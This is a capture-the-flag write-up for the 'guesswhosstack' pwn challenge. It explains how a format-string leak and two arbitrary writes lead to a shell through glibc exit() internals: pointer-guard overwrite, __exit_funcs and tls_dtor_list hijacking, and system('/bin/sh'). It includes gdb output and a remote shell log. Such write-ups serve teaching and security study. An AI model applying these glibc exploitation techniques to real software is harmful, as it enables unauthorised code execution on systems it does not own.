# How to gain a shell in `exit()` with a leak and two arbitrary writes

## Challenge Overview

```
Name: guesswhosstack
Difficulty: Medium
Category: pwn
Author: CaptainNapkins, bronson113

Description:
Back again, shadys back

Thanks pawnlord for the great name.

ncat --ssl guess-who-stack.harkonnen.b01lersc.tf 8443
```

Attachment: [gueswhosstack.zip](./gueswhosstack.zip)

## Initial Analysis

Extract the provided zip attachment, we have C source file and associated Dockerfile:
```sh
> unzip -l gueswhosstack.zip
Archive:  gueswhosstack.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    16224  2025-04-19 10:45   chal
      718  2025-04-19 10:45   chal.c
      317  2025-04-19 10:45   Dockerfile
---------                     -------
    17259                     3 files
```

The binary security settings are good. pwntools's `checksec` says that the binary has no
canary, however, it does have a canary stored in the main frame. The canary isn't checked back
(xor) when main returned because main calls `exit(0)` directly.
```sh
[*] './chal'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

The source file is pretty simple:
```c
int  main() {
    setbuf(stdout, NULL);
    char first_shot[5];
    long s1, d1, d2, s2;
    puts("The prophet Eminem famously said you only have one shot, one opportunity.");
    printf("First shot...");
    scanf("%5s", first_shot);
    printf("\nPalms are sweaty, knees weak, arms are heavy ");
    printf(first_shot);
    printf("\n");

    printf("He opens his mouth but the words don't come out... ");
    scanf("%ld %ld", &s1, &d1);
    printf("\nHe's chokin how, everbody's jokin now... ");
    scanf("%ld %ld", &s2, &d2);

    *(long *) s1 = d1;
    *(long *) s2 = d2;

    printf("Clock's run out, time's up, over, blaow");
    exit(0);
}
```

The program first receives 5 bytes from stdin, then prints them directly via printf.
This is a famous format vulnerability. In this case, it could be used to leak values
on the stack, which contains libc addresses, PIE addresses, and stack addresses.

It then receives 4 long integers from stdin called `s1, d1, s2, d2`. And perform two arbitrary writes:
```c
    *(long *) s1 = d1;
    *(long *) s2 = d2;
```

Since the program call `exit()` directly, I decided to attack `tls_dtor_list` array
that was called inside `exit()` to gain arbitrary executions (the ultimate goal is
always to get shell).

## Environment setup

Using the provided `Dockerfile` to set up a debug environment is needed.
Since I target `tls_dtor_list` that is located inside the TLS section of the program address page. Simply patching the binary via patchelf with custom libc (not system)
is not enough. Because patching makes TLS mapped after libc. This is a known quirk
of using patchelf on some Linux kernels.

> Did you know that you could get the TLS address inside gdb via `p $fs_base` command?

## Dive into `exit()`

`exit` is [a simple wrapper][exit] around [`__run_exit_handlers`][run_exit_handlers]:

```c
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}

void
__run_exit_handlers (int status, struct exit_function_list **listp,
             bool run_list_atexit, bool run_dtors)
    /* snip .. */
    if (run_dtors)
      __call_tls_dtors ();
    /* snip .. */
  while (true)
    {
      struct exit_function_list *cur;
      cur = *listp;
      if (cur == NULL) {
        /* snip .. */
          break;
      }
      while (cur->idx > 0)
        {
          struct exit_function *const f = &cur->fns[--cur->idx];
            /* snip .. */
          switch (f->flavor)
          {
            /* snip .. */
            case ef_free:
            case ef_us:
              break;
            /* snip .. */
            case ef_cxa:
              /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
             we must mark this function as ef_free.  */
              f->flavor = ef_free;
              cxafct = f->func.cxa.fn;
              arg = f->func.cxa.arg;
              PTR_DEMANGLE (cxafct);

              /* snip .. */
              cxafct (arg, status);
              /* snip .. */
          *listp = cur->next;
          if (*listp != NULL)
        /* Don't free the last element in the chain, this is the statically
           allocate element.  */
        free (cur);
```

It in turn always calls `__call_tls_dtors` (We will return back to
`__call_tls_dtors` later). For each `f` in the `__exit_funcs->fns` list (notes
that the list is iterated in reversed from the end of the list), if
`f->flavor == ef_cxa` (hex 0x4), it sets the `f->flavor` to be `ef_free`
so this `f` cannot be called twice. Then `f->func.cxa.fn` is demangled and called.

In gdb, you could view this `__exit_funcs` variable
```gdb
gef➤  p *__exit_funcs
$6 = {
  next = 0x0,
  idx = 0x2,
  fns = {{
      flavor = 0x4,
      func = {
        /* snip .. */
        cxa = {
          fn = 0x968dd3a85dd9cfad,
          arg = 0x0,
          dso_handle = 0x0
        }
      }
    }, {
      flavor = 0x4,
      func = {
        /* snip .. */
        cxa = {
          fn = 0xc3d896fa4939cfad,
          arg = 0x0,
          dso_handle = 0x55555555d008
        }
      }
    }, {
      flavor = 0x0,
      func = {
        at = 0x0,
        /* snip .. */
      }
    } <repeats 30 times>}
}
```

We could control rip by using arbitrary write to overwrite `__exit_funcs->fns[0]`.
This is possible since `__exit_funcs->fns[0]` is located on a page with `rw` permission.
```gdb
gef➤  p &__exit_funcs->fns[0]
$8 = (struct exit_function *) 0x7ffff7e1bf10 <initial+16>
gef➤  vmmap 0x7ffff7e1bf10
0x00007ffff7e1a000 0x00007ffff7e1c000 0x0000000000219000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
```

But we need to understand how to mangle our gadget pointers to defeat
`PTR_DEMANGLE (cxafct)`. The [libc code][ptr_mangle] to (de)mangle pointer is pretty simple (note this is AT&T syntax):
```c
#  define PTR_MANGLE(reg)       xor %fs:POINTER_GUARD, reg;                   \
                                rol $2*LP_SIZE+1, reg
#  define PTR_DEMANGLE(reg)     ror $2*LP_SIZE+1, reg;                        \
                                xor %fs:POINTER_GUARD, reg
```

Here [`POINTER_GUARD`][guard] is `offsetof (tcbhead_t, pointer_guard)`, which is 0x30 on x86_64. You could also rely on gdb to find the offset for you.
```gdb
gef➤  pipe ptype/ox tcbhead_t | grep pointer_guard
/* 0x0030      |  0x0008 */    uintptr_t pointer_guard;
```

I chose to overwrite `tls->pointer_guard` with 0, so we could skip the xor step in mangle.
Hence `PTR_MANGLE` is simplified to `rol address, 17`, which is a rotate-left instruction.

### Hope is lost ?

What's the `address` to give us the shell? Since we have no control over `fns[0]->args`
when `address` is called. And there's no valid one-gadgets to spawn a shell for us.
We have to restart the `main()` function instead. Luckily with glibc, there's always a
`main` address is located after the main's stack frame.
By using a gadget to `add rsp, 0x158; ret`, we return to `main()` again.

### Back to `tls_dtor_list`

Now we're in `main` again. Unfortunately, we cannot use `__exit_funcs` to control rip
since `f->flavor` is set to `ef_free`, which does nothing when iterated over.
And `__exit_funcs->idx` has been decreased to 0. So we need at least **3** writes to
make it work again.

Luckily, there's [`__call_tls_dtors`] which is always called by `__run_exit_handlers`.
```c
void
__call_tls_dtors (void)
{
  while (tls_dtor_list)
    {
      struct dtor_list *cur = tls_dtor_list;
      dtor_func func = cur->func;
      PTR_DEMANGLE (func);

      tls_dtor_list = tls_dtor_list->next;
      func (cur->obj);
      /* snip */
    }
}
```

We can call an arbitrary address by overwriting `tls_dtor_list`. This is possible
since `tls_dtor_list` is located on the same page as TLS, which has RW permission.

```gdb
gef➤  vmmap &tls_dtor_list
0x00007ffff7f82000 0x00007ffff7fa7000 0x0000000000000000 rw-
gef➤  ptype/ox tls_dtor_list
type = struct dtor_list {
/* 0x0000      |  0x0008 */    dtor_func func;
/* 0x0008      |  0x0008 */    void *obj;
/* 0x0010      |  0x0008 */    struct link_map *map;
/* 0x0018      |  0x0008 */    struct dtor_list *next;
```

However, we still have no control over `cur->obj`, so we have to be clever.
We need `tls_dtor_list->next` to point to a known address (non-NULL) so we can
control `obj` later. By choosing `tls_dtor_list = __libc_argv - 0x18`,
`tls_dtor_list->next` will be `__libc_argv`.

So in this step we leak the binary PIE address and call back to `main()`.

### Win

By leaking stack addresses and overwriting `__libc_argv` in the next call,
we control `cur->func` and `cur->obj`. That could be used to call `system("/bin/sh")`.

## Key insights

Vulnerability exploited:
* Format vulnerability to leak important addresses.
* Arbitrary writes

## Final exploit

Please view [run.py](./run.py).
Demo on remote:
```bash
> python run.py REMOTE
[+] Opening connection to guess-who-stack.harkonnen.b01lersc.tf on port 8443: Done
[*] LEAK: main_ret         = 0x7d32b0098150
[*] CALC: libc             = 0x7d32b0070000
[*] CALC: func_0           = 0x7d32b02701b8
[*] CALC: ptr_guard        = 0x7d32b006d770
[*] CALC: tls_dtor_list    = 0x7d32b006d6f0
[*] LEAK: _start           = 0x5844cd51b100
[*] LEAK: stack_leak       = 0x7ffc75c12670
[*] Switching to interactive mode
$ ls
flag.txt
run
$
```

[exit]: https://elixir.bootlin.com/glibc/glibc-2.38.9000/source/stdlib/exit.c#L139
[run_exit_handlers]: https://elixir.bootlin.com/glibc/glibc-2.38.9000/source/stdlib/exit.c#L36
[ptr_mangle]: https://elixir.bootlin.com/glibc/glibc-2.38.9000/source/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h#L43
[guard]: https://elixir.bootlin.com/glibc/glibc-2.38.9000/source/sysdeps/x86_64/nptl/tls.h#L52
[`__call_tls_dtors`]: https://elixir.bootlin.com/glibc/glibc-2.38.9000/source/stdlib/cxa_thread_atexit_impl.c#L147

## Lessons learned

* How `exit()` works in glibc.
* How to defeat `PTR_DEMANGLE`.
* How to overwrite libc's GOT called in `printf` and `gets` by reading author solution.

### Alternative (simpler) approaches

The challenge author posted their exploit script right after the event ended.
Their solution involves overwriting libc GOT of `__memmove_evex_unaligned_erms`
that is called in `printf` with `gets()`. And overwriting `__memchr_evex` called
in `gets()`.
For more information, please view [run-author.py](./run-author.py).
